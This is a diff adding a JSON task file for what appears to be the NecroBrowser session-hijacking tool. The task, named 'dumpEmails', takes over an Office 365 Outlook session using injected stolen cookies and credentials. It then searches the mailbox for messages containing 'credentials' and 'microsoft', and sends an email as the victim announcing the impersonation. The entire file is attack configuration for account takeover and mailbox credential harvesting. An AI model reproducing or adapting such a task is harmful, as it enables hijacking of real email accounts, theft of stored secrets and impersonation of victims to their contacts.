@@ -1,0 +1,21 @@
+{
+  "name": "dumpEmails",
+  "task": {
+    "type": "office365",
+    "name": [ "OutlookExtrude", "OutlookWriteEmail" ],
+    "params": {
+      "fixSession": "https://outlook.office.com/mail/inbox",
+      "keywords": ["credentials", "microsoft"],
+
+      "writeEmail": {
+        "to": "goku.antani@penitenziagite.onmicrosoft.com",
+        "subject": "All your sessions are belong to us",
+        "data": "NecroBrowser is impersonating this user.\n\nBe ready for mayhem clicking here https://google.com\n\nBye",
+        "attachment": "./testing/attachment.png"
+      },
+
+      "credentials": %%%CREDENTIALS%%%
+    }
+  },
+  "cookies": %%%COOKIES%%%
+}
